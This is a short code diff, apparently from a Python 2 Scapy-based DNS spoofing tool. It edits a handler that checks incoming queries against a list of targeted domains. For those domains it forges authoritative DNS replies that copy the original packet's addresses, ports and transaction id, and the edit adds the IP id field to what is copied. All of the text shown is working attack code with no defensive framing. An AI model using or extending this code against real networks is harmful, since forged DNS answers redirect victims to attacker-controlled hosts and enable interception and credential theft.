@@ -47,7 +47,7 @@ def handler(data, addr, socket, dns_ip):
             if url in to_be_spoofed:
                 print "Request for %s will be spoofed" % url[:-1]
                 print "Original\n", original_dns_packet.show()
-                spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src) /\
+                spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src, id=original_dns_packet[DNS].id) /\
                     UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /\
                     DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
                     nscount=1, arcount=0, ancount=1, qdcount=1,
